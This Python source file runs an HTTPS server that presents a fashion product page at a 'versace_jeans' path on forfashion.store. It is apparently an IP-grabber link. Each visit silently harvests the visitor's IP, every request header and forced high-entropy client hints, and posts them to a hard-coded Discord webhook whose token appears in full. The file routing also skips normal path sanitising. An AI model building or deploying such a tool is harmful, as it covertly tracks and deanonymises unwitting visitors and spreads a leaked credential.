import http.server
import socketserver
import os
import socket
import ssl
import threading
import urllib.request
import urllib.parse
import json
from datetime import datetime, timezone

PORT = 443
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PREFIX = "/versace_jeans/couture/purple"
WEBHOOK = "https://discord.com/api/webhooks/1500090443449241721/vMLu5U5lRC0g0QJGyuGmvkSptDGC4bmIWceYyTpEhRVeYkCrIgjy6k2Zt3EAIj358hd0"

CLIENT_HINT_HEADERS = [
    "Sec-CH-UA", "Sec-CH-UA-Mobile", "Sec-CH-UA-Platform",
    "Sec-CH-UA-Platform-Version", "Sec-CH-UA-Full-Version-List",
    "Sec-CH-UA-Arch", "Sec-CH-UA-Bitness", "Sec-CH-UA-Model",
    "Sec-CH-UA-WoW64", "Device-Memory", "Viewport-Width",
    "DPR", "Width", "Downlink", "ECT", "RTT", "Save-Data",
]


def send_webhook(data: dict):
    try:
        ip = data.get("ip", "unknown")
        ua = data.get("User-Agent", "unknown")
        ts = data.get("timestamp", "")

        # Primary info fields
        primary = {
            "IP": ip,
            "Time": ts,
            "Path": data.get("path", ""),
            "User-Agent": ua,
            "Accept-Language": data.get("Accept-Language", ""),
            "Referer": data.get("Referer", ""),
            "Origin": data.get("Origin", ""),
            "X-Forwarded-For": data.get("X-Forwarded-For", ""),
            "X-Real-IP": data.get("X-Real-Ip", ""),
            "CF-Connecting-IP": data.get("Cf-Connecting-Ip", ""),
            "CF-IPCountry": data.get("Cf-Ipcountry", ""),
        }

        # Client hints
        hints = {k: data[k] for k in CLIENT_HINT_HEADERS if data.get(k)}

        # All remaining headers
        skip = set(list(primary.keys()) + CLIENT_HINT_HEADERS + [
            "ip", "timestamp", "path", "method",
        ])
        extra = {k: v for k, v in data.items() if k not in skip and v}

        def fields_from(d, inline=True):
            fields = [
                {"name": str(k)[:256], "value": f"`{str(v)[:1000]}`", "inline": inline}
                for k, v in d.items() if v and str(v).strip()
            ]
            return fields[:25]

        embeds = [
            {
                "title": f"New visitor — {ip}",
                "color": 0x9B59B6,
                "timestamp": ts,
                "fields": fields_from(primary, inline=True),
            }
        ]
        if hints:
            embeds.append({
                "title": "Client Hints",
                "color": 0x3498DB,
                "fields": fields_from(hints, inline=True),
            })
        if extra:
            embeds.append({
                "title": "All Headers",
                "color": 0x2ECC71,
                "fields": fields_from(extra, inline=True),
            })

        payload = json.dumps({"embeds": embeds}).encode()
        req = urllib.request.Request(
            WEBHOOK,
            data=payload,
            headers={
                "Content-Type": "application/json",
                "User-Agent": "DiscordBot (https://example.com, 1.0)",
            },
            method="POST",
        )
        urllib.request.urlopen(req, timeout=5)
    except urllib.error.HTTPError as e:
        print(f"Webhook HTTP error: {e.code} {e.reason} — {e.read().decode()}")
    except Exception as e:
        print(f"Webhook error: {e}")


class Handler(http.server.SimpleHTTPRequestHandler):

    def send_info_headers(self):
        self.send_header("Accept-CH", ", ".join(CLIENT_HINT_HEADERS))
        self.send_header("Critical-CH", ", ".join(CLIENT_HINT_HEADERS))
        self.send_header(
            "Permissions-Policy",
            "ch-ua=*, ch-ua-mobile=*, ch-ua-platform=*, ch-ua-platform-version=*, "
            "ch-ua-full-version-list=*, ch-ua-arch=*, ch-ua-bitness=*, ch-ua-model=*, "
            "ch-device-memory=*, ch-viewport-width=*, ch-dpr=*, ch-width=*, "
            "ch-downlink=*, ch-ect=*, ch-rtt=*, ch-save-data=*",
        )

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path
        is_page = path == PREFIX or path == PREFIX + "/"

        if is_page:
            data = {
                "ip": self.client_address[0],
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "path": self.path,
                "method": self.command,
            }
            for key, val in self.headers.items():
                data[key] = val

            threading.Thread(target=send_webhook, args=(data,), daemon=True).start()

        try:
            super().do_GET()
        except (ConnectionAbortedError, BrokenPipeError):
            pass

    def end_headers(self):
        path = urllib.parse.urlparse(self.path).path
        if path == PREFIX or path == PREFIX + "/":
            self.send_info_headers()
        super().end_headers()

    def translate_path(self, path):
        path = urllib.parse.urlparse(path).path
        if path == PREFIX or path == PREFIX + "/":
            return os.path.join(BASE_DIR, "versace_jeans_couture_purple", "index.html")
        if path.startswith(PREFIX + "/"):
            rel = path[len(PREFIX) + 1:]
            return os.path.join(BASE_DIR, "versace_jeans_couture_purple", rel)
        if path.startswith("/static/"):
            rel = path[len("/static/"):]
            return os.path.join(BASE_DIR, "static", rel)
        return os.path.join(BASE_DIR, path.lstrip("/"))

    def log_message(self, format, *args):
        pass


def get_local_ip():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]


ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(
    '/etc/letsencrypt/live/forfashion.store/fullchain.pem',
    '/etc/letsencrypt/live/forfashion.store/privkey.pem',
)

with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    ip = get_local_ip()
    print(f"Local:   https://localhost{PREFIX}")
    print(f"Network: https://{ip}{PREFIX}")
    httpd.serve_forever()
